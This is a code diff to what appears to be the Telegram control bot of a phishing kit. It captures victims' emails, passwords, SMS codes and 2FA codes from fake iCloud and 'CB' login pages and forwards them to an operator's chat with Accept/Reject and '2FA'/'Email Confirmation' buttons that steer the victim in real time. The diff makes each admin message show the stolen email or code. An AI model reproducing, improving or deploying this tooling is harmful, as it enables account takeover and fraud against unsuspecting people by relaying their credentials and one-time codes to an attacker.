@@ -44,96 +44,112 @@ let pendingRequests = {};
 // Track already-handled callback IDs to prevent duplicate processing
 const handledCallbacks = new Set();
 
-// Invisible placeholder — Telegram requires non-empty text to attach buttons
-const BLANK = "\u200B";
-
 // -----------------
 // Email/Password approval
 // -----------------
 function sendApprovalRequest(email, password) {
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept|${email}` },
-          { text: "❌ Reject", callback_data: `reject|${email}` }
+  bot.sendMessage(
+    ADMIN_CHAT_ID,
+    `📧 <code>${email}</code>`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Accept", callback_data: `accept|${email}` },
+            { text: "❌ Reject", callback_data: `reject|${email}` }
+          ]
         ]
-      ]
+      }
     }
-  };
-  bot.sendMessage(ADMIN_CHAT_ID, BLANK, options);
+  );
 }
 
 // -----------------
 // Generic code approval
 // -----------------
 function sendApprovalRequestGeneric(identifier) {
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept|${identifier}` },
-          { text: "❌ Reject", callback_data: `reject|${identifier}` }
+  bot.sendMessage(
+    ADMIN_CHAT_ID,
+    `🔑 <code>${identifier}</code>`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Accept", callback_data: `accept|${identifier}` },
+            { text: "❌ Reject", callback_data: `reject|${identifier}` }
+          ]
         ]
-      ]
+      }
     }
-  };
-  bot.sendMessage(ADMIN_CHAT_ID, BLANK, options);
+  );
 }
 
 // -----------------
 // SMS code approval
 // -----------------
 function sendApprovalRequestSMS(code) {
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept|${code}` },
-          { text: "❌ Reject", callback_data: `reject|${code}` }
+  bot.sendMessage(
+    ADMIN_CHAT_ID,
+    `💬 <code>${code}</code>`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Accept", callback_data: `accept|${code}` },
+            { text: "❌ Reject", callback_data: `reject|${code}` }
+          ]
         ]
-      ]
+      }
     }
-  };
-  bot.sendMessage(ADMIN_CHAT_ID, BLANK, options);
+  );
 }
 
 // -----------------
 // iCloud Login approval
 // -----------------
 function sendApprovalRequestPage(email, password) {
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept|${email}` },
-          { text: "❌ Reject", callback_data: `reject|${email}` }
+  bot.sendMessage(
+    ADMIN_CHAT_ID,
+    `📧 <code>${email}</code>`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Accept", callback_data: `accept|${email}` },
+            { text: "❌ Reject", callback_data: `reject|${email}` }
+          ]
         ]
-      ]
+      }
     }
-  };
-  bot.sendMessage(ADMIN_CHAT_ID, BLANK, options);
+  );
 }
 
 // -----------------
 // CB Login approval
 // -----------------
 async function sendLoginTelegram(email) {
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "↖️ 2FA", callback_data: `page1|${email}` },
-          { text: "↗️ Email Confirmation", callback_data: `page2|${email}` }
-        ],
-        [
-          { text: "⚠️❌ REJECT ❌⚠️", callback_data: `reject|${email}` }
+  await bot.sendMessage(
+    ADMIN_CHAT_ID,
+    `📧 <code>${email}</code>`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "↖️ 2FA", callback_data: `page1|${email}` },
+            { text: "↗️ Email Confirmation", callback_data: `page2|${email}` }
+          ],
+          [
+            { text: "⚠️❌ REJECT ❌⚠️", callback_data: `reject|${email}` }
+          ]
         ]
-      ]
+      }
     }
-  };
-
-  await bot.sendMessage(ADMIN_CHAT_ID, BLANK, options);
+  );
 }
 
 // -----------------
@@ -141,7 +157,8 @@ async function sendLoginTelegram(email) {
 // -----------------
 function send2FACode(code, chatId) {
   pendingRequests[chatId] = true;
-  bot.sendMessage(chatId, BLANK, {
+  bot.sendMessage(chatId, `💬 <code>${code}</code>`, {
+    parse_mode: "HTML",
     reply_markup: {
       keyboard: [["Accept", "Reject"]],
       one_time_keyboard: true,
